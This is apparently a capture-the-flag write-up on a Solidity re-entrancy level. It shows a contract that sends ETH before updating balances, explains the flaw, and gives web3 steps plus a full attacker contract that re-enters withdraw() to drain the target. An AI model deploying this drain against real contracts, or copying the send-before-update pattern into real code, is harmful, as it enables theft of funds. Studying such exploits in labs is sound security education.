<div align="center">

# Re-entrancy

</div>



**Re-entrancy (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 


1. **Understand the contract**

   - `Reentrance` keeps per-address balances in `mapping(address => uint256) balances;`.  
   - `donate(address _to)` increases `balances[_to]`.  
   - `withdraw(uint256 _amount)` does:
     i. Checks `if (balances[msg.sender] >= _amount)`.
     ii. Calls the recipient: `(bool result,) = msg.sender.call{value: _amount}("");`
     iii. If the call succeeded it does nothing with `_amount` (the `if (result) { _amount; }` is a no-op).
     iv. **Then** it subtracts from the balance: `balances[msg.sender] -= _amount;`.
   - `receive()` is payable and empty — so an attacker contract can accept ETH and run code on `receive`.
   - **Key vulnerability:** the contract sends ETH to `msg.sender` **before** updating `balances[msg.sender]`. That allows an attacker to re-enter `withdraw()` from their fallback/receive and drain funds repeatedly before their balance is reduced.

2. **Exploit Method**

  i. Check the target's ETH balance (this tells you how much to send):  
    `await web3.eth.getBalance(instance)`

  ii. Deploy your attacker contract pointed at the target (same terminal).

  iii. From the attacker, send exactly the amount you read in step 1 to the target to trigger the donate/withdraw sequence and start the reentrancy drain.

  iv. Verify the drain by re-running:  
    `await web3.eth.getBalance(instance)` — the balance should now be zero (or drastically reduced).




## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract AttackReentrance {
    IReentrance private immutable target;
    
    constructor(address _target) {
        target = IReentrance(_target);
    }

    function hack() external payable {
        uint256 amountToDonate = address(target).balance;
        require(msg.value == amountToDonate, "Must send exactly the target's current balance");
        
        // Donate the exact amount equal to the target's initial balance
        target.donate{value: msg.value}(address(this));
        
        // Withdraw the donated amount, triggering reentrancy
        target.withdraw(msg.value);
    }

    receive() external payable {
        // On reentrancy, withdraw again if target still has funds
        uint256 ourBalance = target.balanceOf(address(this));
        if (address(target).balance > 0 && ourBalance > 0) {
            target.withdraw(ourBalance);
        }
    }

    // Optional: Function to extract funds from this contract after drain
    function extractFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}


```

---


